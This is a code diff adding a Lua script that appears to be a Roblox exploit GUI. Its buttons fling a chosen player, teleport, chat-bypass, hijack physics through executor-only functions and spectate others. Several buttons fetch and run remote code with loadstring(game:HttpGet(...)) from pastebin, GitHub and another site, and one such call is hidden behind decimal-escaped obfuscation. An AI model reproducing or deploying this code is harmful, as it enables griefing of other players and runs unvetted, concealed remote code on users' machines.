+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name ~= lplayer.Name then
+					table.insert(Found,v)
+				end
+			end 
+		elseif strl == "me" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name == lplayer.Name then
+					table.insert(Found,v)
+				end
+			end 
+		else
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name:lower():sub(1, #String) == String:lower() then
+					table.insert(Found,v)
+				end
+			end 
+		end
+		return Found 
+	end
+	
+	script.Parent.Parent.ResetButton.MouseButton1Click:Connect(function()
+		kill = false
+	end)
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local target = unpack(GetPlayer(Target.Text)).Character
+	
+		lplayer.Character.Humanoid.PlatformStand = true
+		local coin = Instance.new('BodyThrust',lplayer.Character.HumanoidRootPart)
+	    lplayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;coin.Location = target.Head.Position
+	end)
+end
+coroutine.wrap(HIKC_fake_script)()
+local function QHKFBM_fake_script() -- ShoulderButton.LocalScript 
+	local script = Instance.new('LocalScript', ShoulderButton)
+
+	local lplayer = game:GetService('Players').LocalPlayer
+	local Target = script.Parent.Parent.Target
+	local kill = false
+	function GetPlayer(String)
+		local Found = {}
+		local strl = String:lower()
+		if strl == "all" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				table.insert(Found,v)
+			end
+		elseif strl == "others" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name ~= lplayer.Name then
+					table.insert(Found,v)
+				end
+			end 
+		elseif strl == "me" then
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name == lplayer.Name then
+					table.insert(Found,v)
+				end
+			end 
+		else
+			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+				if v.Name:lower():sub(1, #String) == String:lower() then
+					table.insert(Found,v)
+				end
+			end 
+		end
+		return Found 
+	end
+	
+	script.Parent.Parent.ResetButton.MouseButton1Click:Connect(function()
+		kill = false
+	end)
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local target = unpack(GetPlayer(Target.Text)).Character
+	
+		lplayer.Character.Humanoid.PlatformStand = true
+		kill = true
+		local coin = Instance.new('BodyThrust',lplayer.Character.HumanoidRootPart)
+		repeat lplayer.Character.HumanoidRootPart.CFrame = target.Head.CFrame;coin.Location = target.Head.Position game:GetService('RunService').Heartbeat:wait() until not target.Head or kill == false
+	end)
+end
+coroutine.wrap(QHKFBM_fake_script)()
+local function NTXVFB_fake_script() -- OpenCloseLocal1.LocalScript 
+	local script = Instance.new('LocalScript', OpenCloseLocal1)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.LocalScriptPage.Visible = true
+		script.Parent.Parent.OpenCloseLocal2.Visible = true
+		script.Parent.Parent.OpenCloseLocal1.Visible = false
+	end)
+end
+coroutine.wrap(NTXVFB_fake_script)()
+local function WWLMNK_fake_script() -- OpenCloseLocal2.LocalScript 
+	local script = Instance.new('LocalScript', OpenCloseLocal2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.LocalScriptPage.Visible = false
+		script.Parent.Parent.OpenCloseLocal2.Visible = false
+		script.Parent.Parent.OpenCloseLocal1.Visible = true
+	end)
+end
+coroutine.wrap(WWLMNK_fake_script)()
+local function RYWKSS_fake_script() -- FlyButton.FlyLocal 
+	local script = Instance.new('LocalScript', FlyButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
+	
+	end)
+end
+coroutine.wrap(RYWKSS_fake_script)()
+local function KTXP_fake_script() -- ClickTpButton.FlyLocal 
+	local script = Instance.new('LocalScript', ClickTpButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		mouse = game.Players.LocalPlayer:GetMouse()
+		tool = Instance.new("Tool")
+		tool.RequiresHandle = false
+		tool.Name = "Click Teleport"
+		tool.Activated:connect(function()
+			local pos = mouse.Hit+Vector3.new(0,2.5,0)
+			pos = CFrame.new(pos.X,pos.Y,pos.Z)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+		end)
+		tool.Parent = game.Players.LocalPlayer.Backpack
+	end)
+end
+coroutine.wrap(KTXP_fake_script)()
+local function QNEIZL_fake_script() -- CbypassButton.FlyLocal 
+	local script = Instance.new('LocalScript', CbypassButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
+	end)
+end
+coroutine.wrap(QNEIZL_fake_script)()
+local function HEZJXTA_fake_script() -- telekinesisButton.FlyLocal 
+	local script = Instance.new('LocalScript', telekinesisButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://pastebin.com/raw/aX9aJbt1'))()
+	end)
+end
+coroutine.wrap(HEZJXTA_fake_script)()
+local function VSPHW_fake_script() -- BlackHoleButton.FlyLocal 
+	local script = Instance.new('LocalScript', BlackHoleButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local UserInputService = game:GetService("UserInputService")
+		local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
+		local Folder = Instance.new("Folder", game:GetService("Workspace"))
+		local Part = Instance.new("Part", Folder)
+		local Attachment1 = Instance.new("Attachment", Part)
+		Part.Anchored = true
+		Part.CanCollide = false
+		Part.Transparency = 1
+		local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
+		local NetworkAccess = coroutine.create(function()
+			settings().Physics.AllowSleep = false
+			while game:GetService("RunService").RenderStepped:Wait() do
+				for _, Players in next, game:GetService("Players"):GetPlayers() do
+					if Players ~= game:GetService("Players").LocalPlayer then
+						Players.MaximumSimulationRadius = 0 
+						sethiddenproperty(Players, "SimulationRadius", 0) 
+					end 
+				end
+				game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
+				setsimulationradius(math.huge) 
+			end 
+		end) 
+		coroutine.resume(NetworkAccess)
+		local function ForcePart(v)
+			if v:IsA("Part") and v.Anchored == false and v.Parent:FindFirstChild("Humanoid") == nil and v.Parent:FindFirstChild("Head") == nil and v.Name ~= "Handle" then
+				Mouse.TargetFilter = v
+				for _, x in next, v:GetChildren() do
+					if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
+						x:Destroy()
+					end
+				end
+				if v:FindFirstChild("Attachment") then
+					v:FindFirstChild("Attachment"):Destroy()
+				end
+				if v:FindFirstChild("AlignPosition") then
+					v:FindFirstChild("AlignPosition"):Destroy()
+				end
+				if v:FindFirstChild("Torque") then
+					v:FindFirstChild("Torque"):Destroy()
+				end
+				v.CanCollide = false
+				local Torque = Instance.new("Torque", v)
+				Torque.Torque = Vector3.new(100000, 100000, 100000)
+				local AlignPosition = Instance.new("AlignPosition", v)
+				local Attachment2 = Instance.new("Attachment", v)
+				Torque.Attachment0 = Attachment2
+				AlignPosition.MaxForce = 9999999999999999
+				AlignPosition.MaxVelocity = math.huge
+				AlignPosition.Responsiveness = 200
+				AlignPosition.Attachment0 = Attachment2 
+				AlignPosition.Attachment1 = Attachment1
+			end
+		end
+		for _, v in next, game:GetService("Workspace"):GetDescendants() do
+			ForcePart(v)
+		end
+		game:GetService("Workspace").DescendantAdded:Connect(function(v)
+			ForcePart(v)
+		end)
+		UserInputService.InputBegan:Connect(function(Key, Chat)
+			if Key.KeyCode == Enum.KeyCode.E and not Chat then
+				Updated = Mouse.Hit + Vector3.new(0, 5, 0)
+			end
+		end)
+		spawn(function()
+			while game:GetService("RunService").RenderStepped:Wait() do
+				Attachment1.WorldCFrame = Updated
+			end
+		end)
+	end)
+end
+coroutine.wrap(VSPHW_fake_script)()
+local function NVDZPK_fake_script() -- AdminButton.FlyLocal 
+	local script = Instance.new('LocalScript', AdminButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	end)
+end
+coroutine.wrap(NVDZPK_fake_script)()
+local function YMCAPI_fake_script() -- PartButton.FlyLocal 
+	local script = Instance.new('LocalScript', PartButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+			if v:IsA("Accessory") then
+				if v.Handle:FindFirstChildOfClass("Mesh") or v.Handle:FindFirstChildOfClass("SpecialMesh") then
+					if v.Handle:FindFirstChildOfClass("SpecialMesh") then
+						v.Handle:FindFirstChildOfClass("SpecialMesh"):Remove()
+					end
+				end
+			end
+		end
+	end)
+end
+coroutine.wrap(YMCAPI_fake_script)()
+local function EXBXHCW_fake_script() -- UnanchorButton.FlyLocal 
+	local script = Instance.new('LocalScript', UnanchorButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://pastebin.com/raw/GB9w55bJ'))()
+	end)
+end
+coroutine.wrap(EXBXHCW_fake_script)()
+local function DREYJL_fake_script() -- Polaris_2.LocalScript 
+	local script = Instance.new('LocalScript', Polaris_2)
+
+	
+end
+coroutine.wrap(DREYJL_fake_script)()
+local function BIPKYRU_fake_script() -- Polaris_2.LocalScript 
+	local script = Instance.new('LocalScript', Polaris_2)
+
+	local UIS = game:GetService('UserInputService')
+	local frame = script.Parent
+	local dragToggle = nil
+	local dragSpeed = 0.25
+	local dragStart = nil
+	local startPos = nil
+	
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+	
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+	
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
+end
+coroutine.wrap(BIPKYRU_fake_script)()
+local function IWXF_fake_script() -- ResetButton.LocalScript 
+	local script = Instance.new('LocalScript', ResetButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		game.Players.LocalPlayer.Character.Humanoid.Health = 0
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0)
+	end)
+	
+end
+coroutine.wrap(IWXF_fake_script)()
+local function QLAUJE_fake_script() -- Polaris_2.LocalScript 
+	local script = Instance.new('LocalScript', Polaris_2)
+
+	--Thanks for using this script
+	--This script is made by Joriangames/Problox Studio Scripts
+	--Want to know how to use this? Watch my tutorial: https://youtu.be/T65gtxrukQg
+	local button = script.Parent.OpenSpectate
+	local frame = script.Parent.Frame
+	local title = frame.PlrName
+	local left = frame.Left
+	local right = frame.Right
+	local cam = workspace.CurrentCamera
+	local num = 1
+	local plr = game.Players.LocalPlayer
+	
+	button.MouseButton1Click:Connect(function()
+		if frame.Visible == true then
+			frame.Visible = false
+			title.Text = plr.Name
+			cam.CameraSubject = plr.Character.Humanoid
+			num = 1
+		else
+			frame.Visible = true
+			title.Text = plr.Name
+			cam.CameraSubject = plr.Character.Humanoid
+			num = 1
+		end
+	end)
+	
+	right.MouseButton1Click:Connect(function()
+		local players = game.Players:GetPlayers()
+		local all = #players
+		num = num +1
+		if num > all then
+			num = 1
+		end
+		cam.CameraSubject = players[num].Character.Humanoid
+		title.Text = players[num].Name
+	end)
+	
+	left.MouseButton1Click:Connect(function()
+		local players = game.Players:GetPlayers()
+		local all = #players
+		num = num -1
+		if num < 1 then
+			num = all
+		end
+		cam.CameraSubject = players[num].Character.Humanoid
+		title.Text = players[num].Name
+	end)
+end
+coroutine.wrap(QLAUJE_fake_script)()
+local function YFETIJI_fake_script() -- OpenSpectate.LocalScript 
+	local script = Instance.new('LocalScript', OpenSpectate)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		if script.Parent.Parent.Frame.Visible == false then
+			script.Parent.Parent.UnspeacFrame.Visible = false
+			script.Parent.Parent.speacFrame.Visible = true
+			
+		else
+			
+			script.Parent.Parent.UnspeacFrame.Visible = true
+			script.Parent.Parent.speacFrame.Visible = false
+		end
+	end)
+end
+coroutine.wrap(YFETIJI_fake_script)()
+local function CYRIU_fake_script() -- StopButton.LocalScript 
+	local script = Instance.new('LocalScript', StopButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local Options = {
+			Color3.fromRGB(85, 255, 0),
+			Color3.fromRGB(255, 170, 255)
+		}
+		game.Players.LocalPlayer["Body Colors"].Color = Color3.new(1, 0, 0)
+	end)
+	
+end
+coroutine.wrap(CYRIU_fake_script)()
